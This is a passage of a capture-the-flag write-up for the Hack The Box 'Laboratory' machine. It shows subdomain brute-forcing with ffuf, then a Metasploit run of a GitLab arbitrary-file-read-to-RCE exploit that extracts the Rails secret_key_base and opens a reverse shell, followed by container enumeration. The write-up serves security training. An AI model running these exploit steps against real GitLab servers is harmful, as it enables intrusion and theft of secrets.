style="color:#F8F8F2"><span class="token plain">10.10.10.216 laboratory.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u https://laboratory.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u https://laboratory.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u https://laboratory.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403 -e .txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Nothing to enumerate and it&#x27;s a static HTML SPA.
But looking at the SSL certificate we can see another sub-domaine:
<code>Subject Alternative Name: DNS:git.laboratory.htb</code>.</p><p>But we could have discovered it with brute-force too:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u https://laboratory.htb/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403 -H &#x27;Host: FUZZ.laboratory.htb&#x27; -fs 7254</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.3.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : https://laboratory.htb/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Header           : Host: FUZZ.laboratory.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response status: 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response size: 7254</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.git                    [Status: 302, Size: 106, Words: 5, Lines: 1]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">git                     [Status: 302, Size: 105, Words: 5, Lines: 1]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [56293/56293] :: Job [1/1] :: 1260 req/sec :: Duration: [0:01:03] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s edit our hosts entry:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ grep lab /etc/hosts</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.216 laboratory.htb git.laboratory.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>GitLab is hosted here (make sense now the name of the box is Laboratory and the sub-domaine is <code>git</code>).</p><p>So let&#x27;s register, and then go at <a href="https://git.laboratory.htb/help" target="_blank" rel="noopener noreferrer">https://git.laboratory.htb/help</a> to find the
version deployed: GitLab Community Edition 12.8.1.</p><p>There are a bunch of low quality python Poc ou there but better use the
high quality reliable metasploit ruby exploit:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(multi/http/gitlab_file_read_rce) &gt; info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       Name: GitLab File Read Remote Code Execution</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     Module: exploit/multi/http/gitlab_file_read_rce</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Platform: Ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       Arch: ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Privileged: No</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    License: Metasploit Framework License (BSD)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       Rank: Excellent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Disclosed: 2020-03-26</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Provided by:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  William Bowling (vakzz)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  alanfoster</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module side effects:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ioc-in-logs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> artifacts-on-disk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module stability:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> crash-safe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module reliability:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> repeatable-session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Available targets:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Id  Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  --  ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  0   Automatic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Check supported:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Basic options:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Name             Current Setting                                               Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ----             ---------------                                               --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  DEPTH            15                                                            yes       Define the max traversal depth</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  PASSWORD         password                                                      no        The password for the specified username</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Proxies                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  RHOSTS           10.10.10.216                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  RPORT            443                                                           yes       The target port (TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  yes       The path to the secrets.yml file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  SECRET_KEY_BASE                                                                no        The known secret_key_base from the secrets.yml - this skips the arbitrary file read if present</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  SSL              true                                                          no        Negotiate SSL/TLS for outgoing connections</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  TARGETURI        /users/sign_in                                                yes       The path to the vulnerable application</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  USERNAME         cyfun                                                         no        The username to authenticate as</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  VHOST            git.laboratory.htb                                            no        HTTP server virtual host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload information:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Description:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  This module provides remote code execution against GitLab Community</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Edition (CE) and Enterprise Edition (EE). It combines an arbitrary</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  file read to extract the Rails &quot;secret_key_base&quot;, and gains remote</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  code execution with a deserialization vulnerability of a signed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  &#x27;experimentation_subject_id&#x27; cookie that GitLab uses internally for</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  A/B testing. Note that the arbitrary file read exists in GitLab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  EE/CE 8.5 and later, and was fixed in 12.9.1, 12.8.8, and 12.7.8.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  However, the RCE only affects versions 12.4.0 and above when the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  vulnerable `experimentation_subject_id` cookie was introduced.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Tested on GitLab 12.8.1 and 12.4.0.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">References:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  https://cvedetails.com/cve/CVE-2020-10977/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  https://hackerone.com/reports/827052</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  https://about.gitlab.com/releases/2020/03/26/security-release-12-dot-9-dot-1-released/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(multi/http/gitlab_file_read_rce) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Started reverse TCP handler on 10.10.14.135:4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Executing automatic check (disable AutoCheck to override)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Logged in to user cyfun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Created project /cyfun/id1reBf3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Created project /cyfun/AOeg8gkK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Created issue /cyfun/id1reBf3/issues/1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Executing arbitrary file load</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] File saved as: &#x27;/home/cyfun/.msf4/loot/20210227221445_default_10.10.10.216_gitlab.secrets_687213.txt&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Attempting to delete project /cyfun/id1reBf3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Deleted project /cyfun/id1reBf3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Attempting to delete project /cyfun/AOeg8gkK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Deleted project /cyfun/AOeg8gkK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command shell session 1 opened (10.10.14.135:4444 -&gt; 10.10.10.216:33956) at 2021-02-27 22:14:47 +0100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=998(git) gid=998(git) groups=998(git)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-git-container-to-dexter-host">Privilege Escalation of Machine : from git (container) to dexter (host)<a href="#privilege-escalation-of-machine--from-git-container-to-dexter-host" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from git (container) to dexter (host)" title="Direct link to Privilege Escalation of Machine : from git (container) to dexter (host)">​</a></h2><p>We can see in <code>/etc/passwd</code> there is no human user on the machine
(uid &gt; 1000 in general) but only service accounts (default + gitlab), so we
should target root directly.</p><p>Which OS are we on?</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">git@git:~/gitlab-rails/working$ head -2 /etc/os-release</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NAME=&quot;Ubuntu&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION=&quot;16.04.6 LTS (Xenial Xerus)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Also it&#x27;s a docker container:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">git@git:~/gitlab-rails/working$ ls -lhA / | grep docker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Docker containers are often minimalists and try to lower the attack surface,
here the issue is we neither have <code>ss</code> or <code>netstat</code> to list local ports.</p><p>We can directly read <code>/proc/net/tcp</code> but IP addresses and ports are hex
encoded (in little endian) here.</p><p>Let&#x27;s obtain only IP addresses with this command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">git@git:~/gitlab-rails/working$ cat /proc/net/tcp | cut -d &#x27; &#x27; -f 5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">local_address</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000000:1F7C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23A1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:2382</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23E3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:2385</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:240D</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:1F90</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23D0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000000:0050</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:1F92</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000000:0000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">00000000:0000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:2382</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:2382</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200E0A0A:115C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:1F92</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:240D</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:1F7C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23E3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23D0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:D8EE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">870E0A0A:115C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:E4EA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:DBFA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:E0DA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:D87C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:8F40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200E0A0A:115C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:8FC8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">820E0A0A:115C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23D0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:D88C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:8F46</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:B480</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23D0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:0050</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:8F48</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200E0A0A:23E7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:23A1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:E0E0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200E0A0A:23E7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:8072</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:8F44</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:2414</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0100007F:D88A</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then let&#x27;s write a short ruby script to decode them:</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;ctf_party&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File.foreach(&#x27;local_address.txt&#x27;) do |line|</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ip, port = line.split(&#x27;:&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ip = ip.scan(/.{2}/).map(&amp;:hex2dec).reverse.join(&#x27;.&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  port = port.hex2dec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  puts &quot;#{ip}:#{port}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And execute it:</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby hex2ip.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0.0.0.0:8060</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9121</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9090</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9187</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">127.0.0.1:9093</span><br></span><span 